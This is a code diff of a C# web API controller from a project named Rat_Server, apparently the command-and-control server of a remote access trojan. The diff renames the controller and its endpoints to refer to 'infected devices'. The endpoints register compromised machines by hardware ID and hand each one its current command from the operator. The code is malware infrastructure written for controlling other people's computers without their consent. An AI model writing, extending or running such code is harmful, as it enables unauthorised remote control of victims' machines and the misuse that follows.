@@ -7,24 +7,28 @@ using Rat_Server.Model.Context;
 
 namespace Rat_Server.Controllers
 {
+    /// <summary>
+    /// This Controller is responsible for handling requests that are related to the infected devices.
+    /// This does not include requests that require admin permissions. Those can be found in the AdminController.
+    /// </summary>
     [Route("api/[controller]")]
     [ApiController]
-    public class DeviceController : ControllerBase
+    public class InfectedDeviceController : ControllerBase
     {
         private readonly RatDbContext _context;
         private readonly IConfiguration _config;
 
-        public DeviceController(RatDbContext context, IConfiguration config)
+        public InfectedDeviceController(RatDbContext context, IConfiguration config)
         {
             _context = context;
             _config = config;
         }
 
-        [HttpPost("RegisterDevice")]
+        [HttpPost("RegisterInfectedDevice")]
         [ProducesResponseType(StatusCodes.Status201Created)]
         [ProducesResponseType(StatusCodes.Status400BadRequest)]
         [ProducesResponseType(StatusCodes.Status403Forbidden)]
-        public StatusCodeResult RegisterDevice([FromBody] RegisterDeviceRequestBodyDto requestBody)
+        public StatusCodeResult RegisterInfectedDevice([FromBody] RegisterDeviceRequestBodyDto requestBody)
         {
             // Check if request body is valid
             if (!ModelState.IsValid)
@@ -54,12 +58,12 @@ namespace Rat_Server.Controllers
             return StatusCode(StatusCodes.Status201Created);
         }
 
-        [HttpGet("GetCurrentCommandForDevice")]
+        [HttpGet("GetCurrentCommandForInfectedDevice")]
         [ProducesResponseType(typeof(DeviceCommandDto), StatusCodes.Status200OK)]
         [ProducesResponseType(StatusCodes.Status204NoContent)]
         [ProducesResponseType(StatusCodes.Status400BadRequest)]
         [ProducesResponseType(StatusCodes.Status401Unauthorized)]
-        public ActionResult<DeviceCommandDto> GetCurrentCommandForDevice([FromHeader] Guid Hwid)
+        public ActionResult<DeviceCommandDto> GetCurrentCommandForInfectedDevice([FromHeader] Guid Hwid)
         {
             // If the client didn't provide a Hwid, send back a Bad Request status code
             if (!ModelState.IsValid)
@@ -90,12 +94,6 @@ namespace Rat_Server.Controllers
             {
                 return NoContent();
             }
-        }
-
-        [HttpGet("GetAllDevices")]
-        public ActionResult<List<DeviceCommandDto>> GetAllDevices()
-        {
-            return StatusCode(StatusCodes.Status501NotImplemented);
         }
     }
 }
